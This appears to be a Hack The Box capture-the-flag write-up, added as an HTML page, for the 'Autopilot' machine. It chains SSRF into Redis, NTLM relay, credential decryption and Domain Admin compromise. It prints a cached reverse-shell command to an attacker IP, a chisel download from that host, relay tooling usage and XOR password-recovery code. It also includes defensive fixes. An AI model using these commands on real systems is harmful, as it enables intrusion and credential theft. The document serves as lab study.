@@ -1,0 +1,389 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Autopilot — HTB Writeup (Lanky)</title>
+  <meta name="description" content="Hack The Box Autopilot: Grommunio and Nextcloud enumeration, Seafile SSRF, Redis cache poisoning, Postfix privilege escalation, IMAP NTLM relay to WS02, credential recovery, Go binary reversing, and Domain Admin access.">
+  <link rel="stylesheet" href="../assets/style.css?v=5">
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'><text y='14' font-size='14'>&#9881;</text></svg>">
+</head>
+<body>
+  <header class="nav">
+    <div class="wrap">
+      <a class="brand" href="../index.html">lanky<span class="accent">.pwns</span></a>
+      <a class="link" href="../index.html#lab">← all writeups</a>
+    </div>
+  </header>
+
+  <article class="wrap">
+    <a class="back" href="../index.html#lab">back to writeups</a>
+    <h1 style="margin-top:16px;">Autopilot</h1>
+    <div class="subtitle">Hack The Box · <a href="https://app.hackthebox.com/machines/Autopilot" target="_blank" rel="noopener">app.hackthebox.com/machines/Autopilot</a> · Season 12 · completed 19 October 2026</div>
+    <div class="machine-meta">
+      <span class="pill newpill" data-added="2026-10-19">NEW</span>
+      <span class="pill" style="color:var(--cyan);border-color:rgba(46,230,214,0.35)">Windows</span>
+      <span class="pill diff-hard">Insane</span>
+      <span class="pill season">Season 12</span>
+      <span class="pill">Grommunio</span>
+      <span class="pill">Nextcloud</span>
+      <span class="pill">NTLM relay</span>
+      <span class="pill">Active Directory</span>
+      <span class="pill flagp">User</span>
+      <span class="pill flagp">Root</span>
+      <span class="pill rooted">● Completed</span>
+    </div>
+
+    <div class="callout warn">
+      <span class="tag">Authorised lab note</span>
+      This documents an authorised Hack The Box Season 12 machine. Addresses are ephemeral and changed after lab
+      resets. Flag values are not repeated here; the commands show where they were recovered.
+    </div>
+
+    <div class="callout">
+      <span class="tag">TL;DR</span>
+      Deborah's supplied Grommunio account → Files plugin → controlled Seafile backend → gopher SSRF into Redis →
+      poisoned Nextcloud mailer → <code>grofiles</code> shell → PHP-FPM execution → Postfix configuration abuse →
+      root on Grommunio → Chisel pivot → recurring IMAP NTLM authentication relayed to unsigned SMB on WS02 →
+      Thunderbird credential recovery → local administrator → <code>runas.exe</code> static analysis → Domain Admin →
+      <code>root.txt</code> from DC01.
+    </div>
+
+    <dl class="fact">
+      <dt>External target</dt><dd><code>grommunio.autopilot.htb</code> over HTTPS</dd>
+      <dt>Internal mail host</dt><dd><code>172.16.20.10</code></dd>
+      <dt>Domain controller</dt><dd><code>DC01</code> at <code>172.16.20.1</code></dd>
+      <dt>Workstation</dt><dd><code>WS02</code> at <code>172.16.20.15</code></dd>
+      <dt>Starting account</dt><dd><code>deborah.hernandez</code></dd>
+      <dt>User path</dt><dd>Seafile SSRF → Redis → mail notification → Postfix</dd>
+      <dt>Root path</dt><dd>IMAP NTLM relay → WS02 → saved login → embedded Domain Admin credential</dd>
+    </dl>
+
+    <h2><span class="num">01</span>External enumeration</h2>
+    <p>A full TCP scan left HTTPS as the only exposed service. The certificate supplied the useful virtual hosts.</p>
+    <pre data-lang="bash"><code>sudo nmap -Pn -sS -p- --min-rate 1000 &lt;target-ip&gt;
+sudo nmap -Pn -sV -sC -p443 &lt;target-ip&gt;
+
+echo '&lt;target-ip&gt; grommunio.autopilot.htb autodiscover.autopilot.htb mail.autopilot.htb' \
+  | sudo tee -a /etc/hosts</code></pre>
+    <p>
+      The web interface exposed Grommunio Web, EWS, Autodiscover, ActiveSync, WebDAV, and an integrated
+      Nextcloud-derived Files application. Deborah's supplied credentials authenticated to both the mailbox and
+      the Files service.
+    </p>
+    <pre data-lang="bash"><code>curl -ksS -u 'deborah.hernandez:&lt;supplied-password&gt;' \
+  -X PROPFIND -H 'Depth: 1' \
+  https://grommunio.autopilot.htb/files/remote.php/dav/files/deborah.hernandez/</code></pre>
+    <p>
+      Mail and directory data identified Joshua Harris as a newly provisioned service account and Stephanie Lewis
+      as the provisioner. Direct EWS access to other users and Exchange impersonation both returned access denied,
+      so the useful attack surface was the Files plugin.
+    </p>
+
+    <h2><span class="num">02</span>Controlled Seafile backend</h2>
+    <p>
+      The Grommunio Files plugin allowed a user-controlled Seafile account. A small fake Seafile API was hosted on
+      Kali and returned the endpoints the plugin expected. The legacy account format was stored as version
+      <code>0</code>, with <code>server_ssl</code> represented by an empty array, preserving plain HTTP.
+    </p>
+    <pre data-lang="text"><code>Backend:        Seafile
+Server address: 10.10.15.44
+Server port:    8000
+Account format: version 0
+server_ssl:     []
+
+Observed callbacks:
+POST /api2/auth-token/
+GET  /api2/repos/
+GET  /api2/repos/&lt;repo-id&gt;/file/?p=/test</code></pre>
+    <p>
+      The file endpoint returned a controlled URL, giving an SSRF primitive from the Grommunio host. A
+      <code>gopher://127.0.0.1:6379/...</code> response carried a Redis protocol request into the local cache.
+    </p>
+
+    <h2><span class="num">03</span>Redis poisoning and the grofiles shell</h2>
+    <p>
+      Nextcloud cached the discovered path of the <code>sendmail</code> executable. Replacing that cache value with a
+      Bash callback converted a later email notification into command execution.
+    </p>
+    <pre data-lang="text"><code>Redis key:
+0080d9f8020c1c045f3ae6468d0c933a/findBinaryPathsendmail
+
+Cached command:
+/bin/bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.15.44/9005 0&gt;&amp;1'</code></pre>
+    <p>A harmless WebDAV file and an email share triggered the notification path:</p>
+    <pre data-lang="bash"><code>echo htb &gt;/tmp/pwn.txt
+
+curl -ksS -u 'deborah.hernandez:&lt;supplied-password&gt;' \
+  -X PUT --data-binary @/tmp/pwn.txt \
+  https://grommunio.autopilot.htb/files/remote.php/dav/files/deborah.hernandez/pwn.txt
+
+curl -ksS -u 'deborah.hernandez:&lt;supplied-password&gt;' \
+  -H 'OCS-APIRequest: true' -X POST \
+  --data-urlencode 'path=/pwn.txt' \
+  --data-urlencode 'shareType=4' \
+  --data-urlencode 'shareWith=deborah.hernandez@autopilot.htb' \
+  --data-urlencode 'permissions=1' \
+  'https://grommunio.autopilot.htb/files/ocs/v2.php/apps/files_sharing/api/v1/shares?format=json'</code></pre>
+    <p>The listener received a shell as <code>uid=462(grofiles)</code>.</p>
+
+    <h2><span class="num">04</span>Pivot and internal PHP-FPM</h2>
+    <p>Chisel exposed the internal network through a reverse SOCKS proxy.</p>
+    <pre data-lang="bash"><code># Kali
+chisel server --reverse -p 9002
+
+# Grommunio
+curl http://10.10.15.44:8010/chisel -o /tmp/chisel
+chmod +x /tmp/chisel
+nohup /tmp/chisel client 10.10.15.44:9002 R:1080:socks \
+  &gt;/tmp/chisel.log 2&gt;&amp;1 &amp;</code></pre>
+    <p>
+      Through the pivot, a crafted FastCGI request reached the internal PHP-FPM listener and executed commands as
+      <code>wwwrun</code>. A helper encoded commands before passing them to <code>cgi-fcgi</code>:
+    </p>
+    <pre data-lang="bash"><code>/tmp/fcgi_b64.sh "$(printf %s 'id; whoami; hostname' | base64 -w0)"
+# uid=479(wwwrun) gid=479(www)</code></pre>
+
+    <h2><span class="num">05</span>Root on the Grommunio host</h2>
+    <p>
+      The Grommunio Admin API database-configuration feature could register the permitted <code>POSTCONF</code>
+      commit hook and alter Postfix's <code>daemon_directory</code>. A controlled <code>postfix-script</code> copied
+      Bash to a setuid location when Postfix restarted.
+    </p>
+    <pre data-lang="bash"><code>/var/spool/mail/rootbash -p -c 'id'
+# uid=479(wwwrun) gid=479(www) euid=0(root)</code></pre>
+    <p>With root execution, the user flag was located directly:</p>
+    <pre data-lang="bash"><code>CMD="/var/spool/mail/rootbash -p -c 'find /home /root -type f -name user.txt -print -exec cat {} \\;'"
+/tmp/fcgi_b64.sh "$(printf %s "$CMD" | base64 -w0)"</code></pre>
+    <div class="flag"><span class="label">user.txt</span>recovered from the rooted Grommunio host</div>
+
+    <h2><span class="num">06</span>Map the internal Active Directory</h2>
+    <p>
+      Joshua's service account authenticated to LDAP and SMB. LDAPS was required because the domain controller
+      enforced LDAP signing.
+    </p>
+    <pre data-lang="bash"><code>LDAPTLS_REQCERT=never proxychains4 -q -f /tmp/pc1080.conf \
+  ldapsearch -LLL -x -H ldaps://172.16.20.1:636 \
+  -D 'AUTOPILOT\sa-joshua.harris' -w '&lt;service-account-password&gt;' \
+  -b 'DC=autopilot,DC=htb' \
+  '(&amp;(objectCategory=computer)(dNSHostName=*))' \
+  sAMAccountName dNSHostName operatingSystem</code></pre>
+    <p>The domain contained three key systems:</p>
+    <table>
+      <tr><th>Host</th><th>Address</th><th>Role</th></tr>
+      <tr><td>DC01</td><td><code>172.16.20.1</code></td><td>Windows Server 2025 domain controller</td></tr>
+      <tr><td>Grommunio</td><td><code>172.16.20.10</code></td><td>Linux mail and Files server</td></tr>
+      <tr><td>WS02</td><td><code>172.16.20.15</code></td><td>Windows 11 workstation</td></tr>
+    </table>
+    <p>
+      Joshua belonged to <code>DnsAdmins</code> and <code>System Administrators</code>. The DNS plugin route looked
+      promising, but writes returned access errors or stopped DNS without producing execution. BloodHound showed
+      no shorter useful path to Domain Admin.
+    </p>
+
+    <h2><span class="num">07</span>Find the NTLM relay target</h2>
+    <p>
+      SMB enumeration exposed the intended contrast: DC01 required signing, while WS02 accepted unsigned SMB.
+      A dedicated reverse forward made WS02 available locally on Kali.
+    </p>
+    <pre data-lang="bash"><code># Grommunio
+nohup /tmp/chisel client 10.10.15.44:9002 \
+  R:1445:172.16.20.15:445 \
+  &gt;/tmp/chisel-ws02.log 2&gt;&amp;1 &amp;
+
+# Kali
+proxychains4 -q -f /tmp/pc1080.conf netexec smb 172.16.20.1
+netexec smb 127.0.0.1 --port 1445
+
+# DC01 signing:True
+# WS02 signing:False</code></pre>
+    <p>
+      Monitoring on the owned mail server showed <code>172.16.20.15</code> reconnecting to TCP 143 every few
+      seconds. The client negotiated IMAP STARTTLS and used <code>AUTHENTICATE NTLM</code>. The workstation was
+      repeatedly sending relayable authentication to infrastructure already under our control.
+    </p>
+
+    <h2><span class="num">08</span>Relay IMAP NTLM to WS02</h2>
+    <p>The working relay preserved the live NTLM challenge-response exchange:</p>
+    <ul>
+      <li><code>imap_capture.py</code> temporarily replaced the IMAP listener on Grommunio, used its real TLS certificate, completed STARTTLS, and forwarded NTLM Type 1 and Type 3 messages.</li>
+      <li><code>imap_relay_broker.py</code> listened on Kali TCP 1144 and used Impacket's <code>SMBRelayClient</code> against <code>smb://127.0.0.1:1445</code>.</li>
+      <li>A wrapper restored <code>gromox-imap.service</code> on exit so the capture window did not leave mail offline.</li>
+    </ul>
+    <pre data-lang="bash"><code># Kali
+sudo nohup python3 -u /tmp/imap_relay_broker.py \
+  &gt;/tmp/imap-relay-broker.log 2&gt;&amp;1 &amp;
+
+# Grommunio wrapper
+trap 'systemctl start gromox-imap.service' EXIT INT TERM
+systemctl stop gromox-imap.service
+timeout 180 python3 /tmp/imap_capture.py</code></pre>
+    <pre data-lang="text"><code>TYPE3 identity=AUTOPILOT/stephanie.lewis
+RELAY SUCCESS identity=AUTOPILOT/stephanie.lewis target=WS02</code></pre>
+    <p>
+      Impacket's command-output retrieval failed with <code>STATUS_OBJECT_NAME_NOT_FOUND</code>, but the relayed SMB
+      session itself was administrative and could enumerate <code>C$</code>.
+    </p>
+
+    <h2><span class="num">09</span>Recover Stephanie's saved login</h2>
+    <p>The relayed session downloaded the active Thunderbird profile from WS02:</p>
+    <pre data-lang="text"><code>C:\Users\da-stephanie.lewis\AppData\Roaming\Thunderbird\Profiles\p3xppadz.default-release
+
+logins.json
+key4.db
+cert9.db
+prefs.js</code></pre>
+    <p>Firepwd decrypted the saved Grommunio web and IMAP login:</p>
+    <pre data-lang="bash"><code>git clone --depth 1 https://github.com/lclevy/firepwd.git ~/htb/autopilot/tools/firepwd
+
+python3 ~/htb/autopilot/tools/firepwd/firepwd.py \
+  -d /tmp/ws02-loot/da-stephanie.lewis/p3xppadz.default-release</code></pre>
+    <p>
+      The recovered <code>stephanie.lewis</code> credential authenticated to WS02 with local-administrator rights.
+      NetExec returned <code>(Pwn3d!)</code>, and <code>--sam --lsa</code> recovered the local Administrator NT hash,
+      the WS02 machine-account secret, and a cached <code>da-stephanie.lewis</code> DCC2 hash.
+    </p>
+
+    <h2><span class="num">10</span>Find and reverse runas.exe</h2>
+    <p>
+      The cached Domain Admin hash did not fall to <code>rockyou.txt</code>. The intended source was a small Go
+      executable in Stephanie's profile:
+    </p>
+    <pre data-lang="text"><code>C:\Users\stephanie.lewis\Videos\runas.exe</code></pre>
+    <pre data-lang="bash"><code>smbclient '//127.0.0.1/C$' -p 1445 \
+  -U 'AUTOPILOT\stephanie.lewis%&lt;recovered-password&gt;' \
+  -c 'get Users\stephanie.lewis\Videos\runas.exe runas.exe'
+
+go version -m ./runas.exe
+go tool nm -size ./runas.exe | grep -E 'main\.(main|passwordCipher|passwordKey|runAs)'
+go tool objdump -s 'main.main' ./runas.exe &gt; runas-main.asm</code></pre>
+    <p>The binary exposed two Go slice headers:</p>
+    <pre data-lang="text"><code>0x1401b1910  main.passwordCipher → 0x1401ac6c8, length 14
+0x1401b1930  main.passwordKey    → 0x1401ac6d8, length 14</code></pre>
+    <p><code>main.main</code> used a repeating XOR. Resolving the slice headers and applying the same loop recovered the embedded Domain Admin password:</p>
+    <pre data-lang="python"><code>import struct
+import pefile
+
+pe = pefile.PE("runas.exe")
+base = pe.OPTIONAL_HEADER.ImageBase
+
+def read_va(address, size):
+    return pe.get_data(address - base, size)
+
+def read_go_slice(header_address):
+    pointer, length, _ = struct.unpack("&lt;QQQ", read_va(header_address, 24))
+    return read_va(pointer, length)
+
+ciphertext = read_go_slice(0x1401b1910)
+key = read_go_slice(0x1401b1930)
+plaintext = bytes(value ^ key[i % len(key)] for i, value in enumerate(ciphertext))
+print(plaintext.decode())</code></pre>
+
+    <h2><span class="num">11</span>Domain Admin and root.txt</h2>
+    <p>The recovered credential authenticated as <code>AUTOPILOT\da-stephanie.lewis</code> on DC01:</p>
+    <pre data-lang="bash"><code>proxychains4 -q -f /tmp/pc1080.conf \
+  netexec smb 172.16.20.1 \
+  -d AUTOPILOT \
+  -u da-stephanie.lewis \
+  -p '&lt;embedded-password&gt;'
+
+# AUTOPILOT\da-stephanie.lewis (...) (Pwn3d!)</code></pre>
+    <p>
+      WMI executed but could not retrieve its temporary output file. Reading the administrative share directly was
+      simpler and reliable:
+    </p>
+    <pre data-lang="bash"><code>ROOTFILE=~/htb/autopilot/root.txt
+
+proxychains4 -q -f /tmp/pc1080.conf \
+  smbclient '//172.16.20.1/C$' \
+  -U 'AUTOPILOT\da-stephanie.lewis%&lt;embedded-password&gt;' \
+  -c "get Users/Administrator/Desktop/root.txt $ROOTFILE"
+
+cat "$ROOTFILE"</code></pre>
+    <div class="flag"><span class="label">root.txt</span>recovered from <code>C:\Users\Administrator\Desktop\root.txt</code> on DC01</div>
+
+    <h2><span class="num">12</span>Failed paths and lessons</h2>
+    <ul>
+      <li><strong>EWS impersonation was correctly denied.</strong> Mailbox delegation was not the route to Joshua or Stephanie.</li>
+      <li><strong>DnsAdmins was a distraction.</strong> DNS plugin changes produced access errors and service disruption, not a stable escalation.</li>
+      <li><strong>SMB signing selected the relay target.</strong> DC01 required signing; WS02 did not.</li>
+      <li><strong>A captured hash was not enough.</strong> The recurring IMAP authentication had to be relayed live.</li>
+      <li><strong>Tool output can fail after successful authentication.</strong> Direct SMB operations proved the relayed access when Impacket could not recover its command-output file.</li>
+      <li><strong>The cached DCC2 hash was another detour.</strong> Static analysis of <code>runas.exe</code> revealed the intended credential immediately.</li>
+    </ul>
+
+    <h2><span class="num">13</span>If this were your environment</h2>
+    <div class="finding">
+      <span class="tag">Finding 1 · Critical</span>
+      <h4>User-controlled backend produced SSRF into local services</h4>
+      <p>The Files integration accepted an attacker-controlled Seafile endpoint and followed a returned gopher URL into Redis.</p>
+    </div>
+    <div class="fix">
+      <span class="tag">How I would fix it</span>
+      <ul>
+        <li>Allow-list backend schemes and destinations; reject redirects to loopback, link-local and internal address space.</li>
+        <li>Disable unsupported URL schemes in the HTTP client and validate every redirect hop.</li>
+        <li>Bind Redis to a protected interface, require authentication, and separate application cache namespaces.</li>
+      </ul>
+    </div>
+
+    <div class="finding">
+      <span class="tag">Finding 2 · Critical</span>
+      <h4>Root-controlled execution path was writable through an administrative API</h4>
+      <p>Postfix configuration exposed a path from web-level command execution to a root-owned service restart.</p>
+    </div>
+    <div class="fix">
+      <span class="tag">How I would fix it</span>
+      <ul>
+        <li>Remove configuration keys that change executable directories from application-facing APIs.</li>
+        <li>Enforce root ownership and integrity checks on all Postfix scripts and executable paths.</li>
+        <li>Run management components with narrow sudoers entries or brokered operations instead of broad root authority.</li>
+      </ul>
+    </div>
+
+    <div class="finding">
+      <span class="tag">Finding 3 · Critical</span>
+      <h4>Recurring NTLM authentication could be relayed to unsigned SMB</h4>
+      <p>WS02 automatically authenticated to a compromised server and did not require SMB signing.</p>
+    </div>
+    <div class="fix">
+      <span class="tag">How I would fix it</span>
+      <ul>
+        <li>Require SMB signing on every workstation and server.</li>
+        <li>Disable NTLM where possible and prefer Kerberos with channel binding and mutual authentication.</li>
+        <li>Remove unattended client authentication to infrastructure that does not require it.</li>
+        <li>Alert when workstation credentials authenticate to unexpected server roles.</li>
+      </ul>
+    </div>
+
+    <div class="finding">
+      <span class="tag">Finding 4 · Critical</span>
+      <h4>Privileged credentials were stored in user-accessible files</h4>
+      <p>Thunderbird held a reusable administrative login, and <code>runas.exe</code> embedded a Domain Admin password using reversible XOR.</p>
+    </div>
+    <div class="fix">
+      <span class="tag">How I would fix it</span>
+      <ul>
+        <li>Remove Domain Admin credentials from scripts, binaries, saved browser data and desktop profiles.</li>
+        <li>Use Windows LAPS or a privileged-access-management system for local administration.</li>
+        <li>Use gMSAs for services and just-in-time, tiered accounts for domain administration.</li>
+        <li>Prevent Domain Admin logons to workstations and monitor for credential material in user profiles.</li>
+      </ul>
+    </div>
+
+    <h2><span class="num">14</span>Cleanup</h2>
+    <pre data-lang="bash"><code># Grommunio
+systemctl start gromox-imap.service
+pkill -f '^python3.*/tmp/imap_capture.py' 2&gt;/dev/null || true
+pkill -f '/tmp/chisel client' 2&gt;/dev/null || true
+
+# Kali
+sudo pkill -f '[i]map_relay_broker.py' 2&gt;/dev/null || true
+pkill -f '[c]hisel server --reverse -p 9002' 2&gt;/dev/null || true</code></pre>
+
+    <p style="margin-top:40px;"><a class="back" href="../index.html#lab">back to writeups</a></p>
+  </article>
+
+  <footer><div class="wrap">Autopilot · Season 12 · completed · notes by Luke &nbsp;·&nbsp; <a href="../index.html#lab">all writeups</a></div></footer>
+</body>
+</html>
